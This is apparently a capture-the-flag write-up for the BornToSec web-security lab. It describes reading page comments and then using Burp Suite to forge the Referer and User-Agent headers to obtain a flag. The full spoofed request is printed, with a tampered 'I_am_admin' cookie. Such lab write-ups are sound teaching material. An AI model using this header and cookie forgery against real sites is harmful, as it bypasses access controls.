# headers
In the footer of the home page there is a link © BornToSec
We inspect the page we got some comments at the end of the page

> You must come from : "https://www.nsa.gov/".

>	Let's use this browser : "ft_bornToSec". It will help you a lot.

We need to change the headers in the request to do that I used burpsuite 

changed referer header to "https://www.nsa.gov/
and User-Agent to ft_bornToSec

the request is now like this :

> GET /?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f HTTP/1.1

>Host: 10.11.43.99

>Cache-Control: max-age=0

>Upgrade-Insecure-Requests: 1

>User-Agent: ft_bornToSec

>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

>Referer: https://www.nsa.gov/

>Accept-Encoding: gzip, deflate

>Accept-Language: en-US,en;q=0.9

>Cookie: I_am_admin=68934a3e9455fa72420237eb05902327

>Connection: close 

send the request in the intruder

and got the flag!
